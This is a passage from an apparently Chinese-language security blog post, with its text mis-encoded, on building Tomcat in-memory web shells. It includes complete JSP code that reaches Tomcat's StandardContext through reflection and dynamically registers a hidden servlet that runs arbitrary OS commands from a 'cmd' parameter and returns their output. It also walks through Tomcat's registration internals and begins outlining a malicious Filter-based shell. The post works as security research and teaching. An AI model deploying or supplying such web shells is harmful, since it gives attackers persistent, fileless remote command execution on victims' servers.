Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                    servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>                    <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>                    out.println(output);<br>                    out.flush();<br>                    out.close();<br>                &#125;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>            &#125;<br>        &#125;;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>        wrapper.setName(servletName);<br>        wrapper.setServlet(servlet);<br>        wrapper.setServletClass(servlet.getClass().getName());<br>        wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>        standardContext.addChild(wrapper);<br>        standardContext.addServletMappingDecoded(servletURL, servletName);<br>        response.getWriter().write(<span class="hljs-string">&quot;[+] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletURL + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletName + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/test&quot;</span> + servletURL + <span class="hljs-string">&quot;?cmd=echo ä¸–ç•Œï¼Œä½ å¥½ï¼&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> e.getMessage();<br>        response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">outError</span> <span class="hljs-operator">=</span> response.getWriter();<br>        outError.println(<span class="hljs-string">&quot;Error: &quot;</span> + errorMessage);<br>        outError.flush();<br>        outError.close();<br>    &#125;<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;%!<br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getRandomString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">characters</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">randomString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (Math.random() * characters.length());<br>            randomString.append(characters.charAt(index));<br>        &#125;<br>        <span class="hljs-keyword">return</span> randomString.toString();<br>    &#125;<br>%&gt;<br><br></code></pre></td></tr></table></figure><p>æ‰“å…¥åæ•ˆæœ</p><p><img src="https://cdn.clown2024.cn/202409161601686.png" alt="image-20240916160158629"></p><p>ç„¶åå°±å¯ä»¥å»è®¿é—®å¯¹åº”è·¯ç”±æ‰§è¡Œå‘½ä»¤</p><p><img src="https://cdn.clown2024.cn/202409161602929.png" alt="image-20240916160242879"></p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>servletå†…å­˜é©¬å°±æ˜¯å»æ‰¾åˆ°æºç ä¸­æ³¨å†Œservletçš„å†…å®¹ï¼Œç„¶åæˆ‘ä»¬é‡å¤ä¸€éç›´æ¥æ³¨å†Œè‡ªå·±çš„servletå³å¯</p><p>è¿™é‡Œæˆ‘ä»¬æ˜¯å»æ‰¾æºç ä¸­å¦‚ä½•å°†web.xmlçš„é…ç½®å˜æˆservletçš„è¿‡ç¨‹</p><p>é¦–å…ˆæ‰¾åˆ°åŠ è½½web.xmlçš„ContextConfig#webconfig()</p><p><img src="https://cdn.clown2024.cn/202409161629329.png" alt="image-20240916162907251"></p><p>ç„¶åé‡Œé¢å°±æ˜¯è¯»å–web.xmlçš„ä¸€äº›ä»£ç ï¼Œé‡è¦åœ¨ç¬¬ä¹ä¸ªæ­¥éª¤</p><p><img src="https://cdn.clown2024.cn/202409161630551.png" alt="image-20240916163037486"></p><p>è¿™é‡Œæ³¨é‡Šå°†web.xmlåº”ç”¨äºContextï¼Œè°ƒç”¨ContextConfig#configureContextæ–¹æ³•</p><p>è·Ÿè¿›å»çœ‹ä¸€çœ‹</p><p><img src="https://cdn.clown2024.cn/202409161637697.png" alt="image-20240916163737624"></p><p>è¿™é‡Œæœ‰å¾ˆå¤šçš„æ“ä½œéƒ½æ˜¯é€šè¿‡contextåŠ è½½è¿›å»ï¼Œè¿™é‡Œçš„contextå°±æ˜¯æˆ‘ä»¬çš„StandardContextï¼Œtomcatæ¯ä¸ªå®¹å™¨å¯åŠ¨æ—¶éƒ½ä¼šé€šè¿‡ä¸€ä¸ªStandard***#startInternal()æ–¹æ³•æ¥å¯åŠ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å…·ä½“çš„contextå°±æ˜¯StandardContextå¼€å§‹çš„ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒè¯•çœ‹çœ‹è¿™ä¸ªcontext</p><p><img src="https://cdn.clown2024.cn/202409161650754.png" alt="image-20240916165022674"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æˆ‘ä»¬çš„StandardContextï¼Œç„¶åè¿™ä¸ªwebxmlé‡Œé¢å°±æœ‰è§£ææˆ‘ä»¬web.xmlæ–‡ä»¶æ‹¿åˆ°çš„servlet</p><p><img src="https://cdn.clown2024.cn/202409161651016.png" alt="image-20240916165127949"></p><p>è¿™ä¸ªHelloå°±æ˜¯æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„ï¼Œ<strong>æ‰€ä»¥ç¬¬ä¸€æ­¥çš„æ‰¾åˆ°StandardContextï¼Œå…¶å®å°±æ˜¯è·å–å½“å‰åº”ç”¨çš„contextå®ä¾‹</strong>ï¼Œç„¶åå¾€é‡Œé¢æ³¨å†Œservletï¼Œæˆ‘ä»¬å›åˆ°configureContextæ–¹æ³•ç»§ç»­å¾€ä¸‹æ‰¾å…³é”®åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202409161658274.png" alt="image-20240916165818197"></p><p>è¿™é‡Œéå†æˆ‘ä»¬çš„servletç„¶ååˆ›å»ºwrapperï¼Œæˆ‘ä»¬çŸ¥é“wrapperå°±æ˜¯ç”¨æ¥å°è£…servletçš„</p><p><img src="https://cdn.clown2024.cn/202409161701466.png" alt="image-20240916170126390"></p><p>ç„¶åè¿™é‡Œçš„wrapperå°±æ˜¯æˆ‘ä»¬çŸ¥é“çš„tomcatå®šä¹‰çš„Wrapperçš„å®ç°ç±»ï¼Œæ‹¿åˆ°wrapperä¹‹åç»§ç»­å¾€ä¸‹ï¼Œçœ‹ä¸€ä¸‹å…³é”®çš„setæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409161708368.png" alt="image-20240916170822326"></p><p>ç¬¬ä¸€æ­¥å…ˆå¯¹loadOnStartupçš„å€¼è¿›è¡Œè®¾ç½®ï¼Œè¿™ä¸ªå€¼ä»£è¡¨çš„æ˜¯Servletåœ¨å¯åŠ¨æ—¶çš„åŠ è½½é¡ºåºï¼Œå¦‚æœè®¾ç½®ä¸ºè´Ÿæ•°ï¼Œé‚£ä¹ˆServletå°†åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶æ‰è¢«åŠ è½½</p><p><img src="https://cdn.clown2024.cn/202409161715978.png" alt="image-20240916171559932"></p><p>è¿™ä¸€æ­¥å°±æ˜¯è¿™æ˜¯servletçš„name</p><p><img src="https://cdn.clown2024.cn/202409161716418.png" alt="image-20240916171636372"></p><p>è¿™ä¸€æ­¥è®¾ç½®servletClassç”¨çš„æ˜¯å…¨ç±»å</p><p><img src="https://cdn.clown2024.cn/202409161719067.png" alt="image-20240916171908029"></p><p>è¿™ä¸€æ­¥å°†å‰é¢çš„wrapperæ·»åŠ åˆ°contexté‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202409161721789.png" alt="image-20240916172036567"></p><p>ç„¶åè¿™æ˜¯å°†å‰é¢çš„servletéå†å®Œä¹‹åï¼Œå†éå†servletMappingï¼Œå¾€contexté‡Œé¢æ·»åŠ æ˜ å°„ï¼Œä¸‹é¢æ˜¯servletMappings</p><p><img src="https://cdn.clown2024.cn/202409161722241.png" alt="image-20240916172220190"></p><p>ç„¶åè¿™å°±æ˜¯æ•´ä¸ªæ³¨å†Œçš„æµç¨‹ï¼Œä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰å®ä¾‹åŒ–æˆ‘ä»¬å†™çš„Servletç±»ï¼Œå› ä¸ºå®ƒå­˜åœ¨æ‡’åŠ è½½æœºåˆ¶ï¼Œéœ€è¦æˆ‘ä»¬å»è®¿é—®çš„æ—¶å€™æ‰ä¼šåˆ›å»ºå®ä¾‹ï¼Œä½†å¦‚æœæˆ‘ä»¬è‡ªå·±åŠ¨æ€åœ¨é¡µé¢å†™å°±ä¼šèµ°ä¸åˆ°é‚£ä¸ªæµç¨‹ï¼Œéœ€è¦æˆ‘ä»¬ç›´æ¥å°†å®ä¾‹ç±»æ”¾è¿›å»</p><p>ç°åœ¨çŸ¥é“æ‰€æœ‰æµç¨‹æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å†™å†…å­˜é©¬äº†ï¼Œè¿™é‡Œæ˜¯æ ¹æ®ç»„é•¿çš„æµç¨‹æ¥å†™ï¼Œæ¯”è¾ƒç®€å•</p><p>ç¬¬ä¸€æ­¥æ‰¾åˆ°standardContextï¼Œè¿™ä¹Ÿæ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“jspé‡Œé¢æ˜¯æœ‰requestå¯¹è±¡çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡requestå¯¹è±¡æ¥è·å–standardContext</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>System.out.println(servletContext);<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆçœ‹çœ‹request#getServletContextè¿”å›çš„å¯¹è±¡</p><p><img src="https://cdn.clown2024.cn/202409161746714.png" alt="image-20240916174627626"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¾€é‡Œé¢ç¬¬äºŒå±‚çš„contextå°±æ˜¯StandardContextï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨åå°„æ¥è·å–</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.è·å–standardContext</span><br>        <span class="hljs-comment">//è·å–ApplicationContext</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//è·å–StandardContext</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><p>ç„¶ååé¢çš„å°±æ¯”è¾ƒç®€å•äº†ï¼ŒæŒ‰ç…§æˆ‘ä»¬å‰é¢åˆ†æçš„æ³¨å†Œæ­¥éª¤å³å¯ï¼Œå°±æ˜¯è¦æ³¨æ„ä¸€ç‚¹æˆ‘ä»¬è¦æ‰‹åŠ¨å°†servletå®ä¾‹æ³¨å†Œè¿›å»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//2.è·å–wrapperç„¶åæ·»åŠ </span><br><span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>wrapper.setServletClass(TestShell.class.getName());<br>   <span class="hljs-comment">//åº”å¯¹æ‡’åŠ è½½æ·»åŠ æˆ‘ä»¬çš„å®ä¾‹åŒ–servlet</span><br>wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br><span class="hljs-comment">//3.å°†wrapperæ·»åŠ è¿›standardContext</span><br>standardContext.addChild(wrapper);<br><span class="hljs-comment">//4.æ·»åŠ æ˜ å°„</span><br>standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br></code></pre></td></tr></table></figure><p>ç„¶åè¿™ä¸ªservletæˆ‘ä»¬å°±ç®€å•çš„å¼¹ä¸€ä¸ªè®¡ç®—å™¨ï¼Œå®Œæ•´çš„jspæ–‡ä»¶å¦‚ä¸‹</p><p>addServlet.jsp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br><span class="hljs-comment">//åŠ¨æ€æ³¨å†Œ</span><br>    <span class="hljs-comment">//1.è·å–standardContext</span><br>        <span class="hljs-comment">//è·å–ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//è·å–StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>    <span class="hljs-comment">//2.è·å–wrapperç„¶åæ·»åŠ </span><br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>    wrapper.setServletClass(TestShell.class.getName());<br>        <span class="hljs-comment">//åº”å¯¹æ‡’åŠ è½½æ·»åŠ æˆ‘ä»¬çš„å®ä¾‹åŒ–servlet</span><br>    wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br>    <span class="hljs-comment">//3.å°†wrapperæ·»åŠ è¿›standardContext</span><br>    standardContext.addChild(wrapper);<br>    <span class="hljs-comment">//4.æ·»åŠ æ˜ å°„</span><br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409161818833.png" alt="image-20240916181846766"></p><p><img src="https://cdn.clown2024.cn/202409161819095.png" alt="image-20240916181903999"></p><p>ç„¶åæˆåŠŸç™½å±å¼¹è®¡ç®—å™¨ğŸ˜‹</p><p>è€Œæˆ‘ä»¬å‰é¢çš„demoæˆ‘æ˜¯ç›´æ¥ç”¨çš„æ–‡ç« é‡Œçš„ï¼Œä»–è¿™é‡Œå°±æ˜¯ç”¨äº†ä¸€ä¸ªéšæœºè·¯å¾„å’Œéšæœºæ–‡ä»¶åçš„æ–¹å¼æ³¨å†Œï¼Œç„¶åç›´æ¥ç”¨åŒ¿åç±»çš„å½¢å¼è¿›è¡Œå®ç°åŒ–ï¼Œç„¶åç›´æ¥å°†å‘½ä»¤ç»“æœæ‰“å°å‡ºæ¥åˆ°ç½‘é¡µ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(output);<br>            out.flush();<br>            out.close();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä»–è¿™é‡Œä½¿ç”¨<code>cmd /c</code>æ¥å®ç°å¯ä»¥æ‰§è¡Œå¸¦æœ‰ç©ºæ ¼çš„å‘½ä»¤ï¼Œä¾‹å¦‚<code>echo ä¸–ç•Œï¼Œä½ å¥½ï¼</code>ï¼›å¯¹äºLinuxç³»ç»Ÿï¼Œé‚£å°±æ˜¯<code>/bin/sh -c</code></p><blockquote><p>è‡³äºLoadOnStartUpè¿™ä¸ªç©æ„æ²¡å‘ç°ä»–çš„ä½œç”¨æš‚æ—¶</p></blockquote><p><strong>å…³äºå®ä¾‹åŒ–servletçš„æ·»åŠ </strong></p><p>å› ä¸ºæ‡’åŠ è½½æœºåˆ¶æˆ‘ä»¬æ˜¯åœ¨è®¿é—®åæ‰è¿›è¡Œçš„å®ä¾‹åŒ–servletï¼Œç„¶åæˆ‘å°±æƒ³æ¢ç©¶ä¸€ä¸‹è¿™ä¸ªservletåˆ°åº•æ˜¯åœ¨å“ªé‡Œè¢«å®ä¾‹åŒ–ç„¶åæ·»åŠ åˆ°wrapperé‡Œé¢ï¼Œä½†æˆ‘è°ƒäº†å¾ˆä¹…ä¹Ÿæ²¡æœ‰å‘ç°æ”¾è¿›wrapperçš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202409192045616.png" alt="image-20240919204457080"></p><p>æˆ‘è¿™é‡Œæ‰¾åˆ°çš„è°ƒç”¨StandardWrapper#allocate()æ¥å®ä¾‹åŒ–ä¸€ä¸ªservletï¼Œç„¶åå¾€ä¸‹æœ‰ä¸ªcreateFilterChainå‡½æ•°ï¼Œä»–å°†servletä¼ é€’äº†è¿›å»ï¼Œæˆ‘å°±å»çœ‹äº†ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409192050093.png" alt="image-20240919205001955"></p><p>ç„¶ååªæœ‰è¿™é‡Œæ˜¯å°†å®ä¾‹æ·»åŠ è¿›äº†filterchainï¼Œæ­¤æ—¶æˆ‘è¿˜æ˜¯æ²¡çœ‹åˆ°å¦‚expé‡Œé¢çš„è¦å°†servletæ”¾è¿›wrapperé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202409192054750.png" alt="image-20240919205426641"></p><p>æœ€åæ‰§è¡Œåˆ°servletçš„æ—¶å€™å°±æ˜¯åœ¨doFilteræ–¹æ³•é‡Œé¢è°ƒç”¨servletå±æ€§çš„serviceæ–¹æ³•ï¼Œç„¶ååˆ°servletçš„doGetæ–¹æ³•é‡Œäº†</p><p>åæ¥ç»ˆäºæƒ³é€šäº†ï¼Œçœ‹ä»£ç å¤ªä¸ç»†è‡´è¿˜æ˜¯æ¼äº†å…³é”®çš„åœ°æ–¹ï¼Œæˆ‘åœ¨è®¿é—®å†…å­˜é©¬é¡µé¢ä¹‹åå†è°ƒè¯•å›åˆ°é‚£ä¸ªallocateæ–¹æ³•é‡Œé¢ï¼Œå‘ç°æˆ‘ä»¬è®¾ç½®äº†å®ä¾‹ä¹‹åä»–çš„åˆ¤æ–­é€»è¾‘å°±ä¸åŒäº†</p><p><img src="https://cdn.clown2024.cn/202409192108171.png" alt="image-20240919210819062"></p><p>å› ä¸ºæˆ‘ä»¬è®¾ç½®äº†instanceï¼Œè¿™éƒ¨åˆ†çš„é€»è¾‘å°±è¢«è·³è¿‡äº†ï¼Œç„¶åå°±ä¼šåˆ°ä¸‹é¢è¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/202409192109478.png" alt="image-20240919210910379"></p><p>ç›´æ¥è¿”å›æˆ‘ä»¬è®¾ç½®çš„instanceï¼Œç„¶åå†æ”¾è¿›äº†filterchainé‡Œé¢ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦ç”¨wrapper.setServletæ–¹æ³•çš„åŸå› </p><p>æ‰€ä»¥å…¶å®æˆ‘åœ¨æƒ³å¦‚æœèƒ½å¤Ÿè·å–filterChainçš„è¯ç›´æ¥æ·»åŠ æ•ˆæœåº”è¯¥ä¹Ÿæ˜¯ä¸€æ ·çš„</p><h1 id="filterå†…å­˜é©¬"><a href="#Filterå†…å­˜é©¬" class="headerlink" title="Filterå†…å­˜é©¬"></a>Filterå†…å­˜é©¬</h1><p>è¿™éƒ¨åˆ†å‚è€ƒæ–‡ç« ï¼š<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/%EF%BC%8Chttps://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/ï¼Œhttps://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p>å†™Filterå†…å­˜é©¬çš„æ­¥éª¤ï¼š</p><ul><li>è·å–StandardContextï¼›</li><li>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„filterï¼›</li><li>å®ä¾‹åŒ–ä¸€ä¸ªFilterDefç±»ï¼ŒåŒ…è£…filterå¹¶å­˜æ”¾åˆ°<code>StandardContext.filterDefs</code>ä¸­ï¼›</li><li>å®ä¾‹åŒ–ä¸€ä¸ªFilterMapç±»ï¼Œå°†æˆ‘ä»¬çš„Filterå’Œurlpatternç›¸å¯¹åº”ï¼Œä½¿ç”¨addFilterMapBeforeå­˜æ”¾åˆ°StandardContext.filterMapsä¸­ï¼›</li><li>é€šè¿‡åå°„è·å–filterConfigsï¼Œå®ä¾‹åŒ–ä¸€ä¸ª<code>FilterConfig</code>ï¼ˆ<code>ApplicationFilterConfig</code>ï¼‰ç±»ï¼Œä¼ å…¥<code>StandardContext</code>ä¸<code>filterDefs</code>ï¼Œå­˜æ”¾åˆ°filterConfigä¸­ã€‚</li></ul><p>æœ‰å…³filterç›¸å…³çš„å†…å®¹å¯ä»¥çœ‹ä¸€ä¸‹é‡Œé¢æ–‡ç« çš„æ€»ç»“ã€‚</p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ-1" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>è¿™é‡Œå¼€å§‹å…ˆåˆ†æå†å†™</p><p>filteræˆ‘ä»¬çŸ¥é“å°±æ˜¯servletå‰çš„ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦å®ç°ä¸€ä¸ªfilterå¹¶å†™æ¶æ„ä»£ç ï¼Œç„¶åæ·»åŠ 